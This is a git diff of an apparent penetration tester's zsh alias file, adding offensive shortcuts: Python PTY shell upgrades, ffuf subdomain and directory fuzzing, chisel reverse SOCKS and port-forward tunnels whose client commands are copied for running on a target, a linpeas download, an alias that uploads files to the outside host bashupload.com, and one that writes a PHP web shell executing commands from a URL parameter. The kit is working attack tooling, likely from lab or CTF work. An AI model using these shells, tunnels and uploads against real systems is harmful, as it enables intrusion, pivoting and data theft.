@@ -59,14 +59,73 @@ gen_ps_rev () {
 
 
 # TTY upgrades
-py_tty_upgrade () {
-  echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
+uptty () {
+  echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
 }
-py3_tty_upgrade () {
-  echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
+
+
+# Ffuf vhost
+vhost() {
+        ffuf -H "Host: FUZZ.$1" -u http://$1 -w /opt/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt ${@: 2};
 }
+
+# Ffuf files and dir
+fuzz_dir() {
+      if [ "$#" -ne 2 ];
+      then  "[i] Usage: fuzz_dir <url> <opt_args>"
+      else  
+        ffuf -u "$1/FUZZ" -w /opt/seclists/Discovery/Web-Content/raft-large-directories.txt -e .php,.asp,.txt,.php.old,.html,.php.bak,.bak,.aspx ${@: 2};
+      fi
+}
+
+# Chisel
+chisel_socks() {
+        if [ "$#" -ne 2 ];
+        then
+          echo "[i] Usage: chisel_socks <ip> <server_port>"
+        else
+          echo "[+] copied chisel client -v $1:$2 R:socks in clipboard"
+          echo "./chisel client -v $1:$2 R:socks" | xclip -sel c
+          ~/zsh-aliases/tools/chisel server -v -p $2 --reverse
+        fi
+}
+
+chisel_forward() {
+    if [ "$#" -ne 4 ]; then
+        echo "[i] Usage: chisel_remote <local_ip> <local_port> <remote_ip> <remote_port>"
+    else
+        echo "./chisel client $1:8888 R:$2:$3:$4" | xclip -sel clip
+        echo "[+] Copied to clipboard: ./chisel client $1:8888 R:$2:$3:$4"
+        echo "[+] Run this on the target machine"
+        ~/zsh-aliases/tools/chisel server -p 8888 --reverse
+    fi
+}
+
+
+# Hosts
+addhost() {
+    if [ "$#" -ne 2 ]; then
+      echo "[i] Usage: addhost <ip> <hostname>"
+      return 1
+    fi
+
+    ip="$1"
+    hostname="$2"
+    if grep -q "^$ip" /etc/hosts; then
+      sudo sed -i "/^$ip/s/$/ $hostname/" /etc/hosts
+      echo "[+] Appended $hostname to existing entry for $ip in /etc/hosts"
+    else
+      echo "$ip $hostname" | sudo tee -a /etc/hosts > /dev/null
+      echo "[+] Added new entry: $ip $hostname to /etc/hosts"
+    fi
+
+    grep "^$ip" /etc/hosts
+}
+
 alias script_tty_upgrade="echo '/usr/bin/script -qc /bin/bash /dev/null'| xclip -sel clip"
 alias tty_fix="stty raw -echo; fg; reset"
 alias tty_conf="stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g' | xclip -sel clip"
-
+alias linpeas="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -s --output lin.sh"
+alias upload='curl bashupload.com -T "${@}"'
+alias phpcmd='echo "<?=\`\$_GET[0]\`?>" > cmd.php && echo "[+] wrote <?=\`\$_GET[0]\`?> in cmd.php"'
 export PATH=~/zsh-aliases/shells/:$PATH
